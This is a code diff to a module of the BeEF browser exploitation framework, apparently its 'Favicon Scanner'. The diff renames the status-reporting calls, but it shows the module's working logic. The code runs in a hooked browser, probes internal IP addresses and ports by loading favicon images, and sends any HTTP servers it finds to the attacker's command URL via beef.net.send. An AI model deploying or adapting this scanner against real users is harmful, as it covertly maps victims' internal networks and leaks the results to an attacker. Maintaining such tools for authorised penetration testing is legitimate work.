@@ -15,7 +15,7 @@ beef.execute(function() {
 
   if(beef.browser.isO()) {
     beef.debug("[Favicon Scanner] Browser is not supported.");
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser", beef.are.status_error());
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser", beef.status.error());
     return;
   }
 
@@ -39,7 +39,7 @@ beef.execute(function() {
   }
   ports = sort_unique(target_ports);
   if (ports.length == 0) {
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=no ports specified", beef.are.status_error());
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=no ports specified", beef.status.error());
     return;
   }
 
@@ -79,7 +79,7 @@ beef.execute(function() {
     }
     ips = sort_unique(target_ips);
     if (ips.length == 0) {
-        beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed target IP address(es) supplied", beef.are.status_error());
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed target IP address(es) supplied", beef.status.error());
         return;
     }
   }
@@ -93,7 +93,7 @@ beef.execute(function() {
     img.src = proto+"://"+ip+":"+port+uri;
     img.onerror = function() { dom.removeChild(this); }
     img.onload = function() {
-      beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+"&url="+escape(this.src), beef.are.status_success());dom.removeChild(this);
+      beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+"&url="+escape(this.src), beef.status.success());dom.removeChild(this);
       beef.debug("[Favicon Scanner] Found HTTP Server [" + escape(this.src) + "]");
     }
     dom.appendChild(img);
